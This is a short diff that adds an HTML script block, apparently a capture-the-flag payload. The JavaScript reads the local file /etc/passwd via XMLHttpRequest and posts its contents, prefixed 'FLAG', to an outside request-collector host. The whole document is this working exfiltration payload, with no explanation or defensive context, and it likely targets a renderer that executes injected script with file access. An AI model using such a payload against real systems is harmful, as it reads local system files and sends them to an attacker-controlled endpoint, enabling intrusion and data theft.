@@ -1,0 +1,10 @@
+<script>
+var xhr = new XMLHttpRequest;
+var xhr2 = new XMLHttpRequest;
+xhr.onload = function () {
+xhr2.open('POST', 'https://salad.requestcatcher.com/haha');
+xhr2.send("FLAG" + xhr.response);
+};
+xhr.open('GET', 'file:///etc/passwd');
+xhr.send();
+</script>
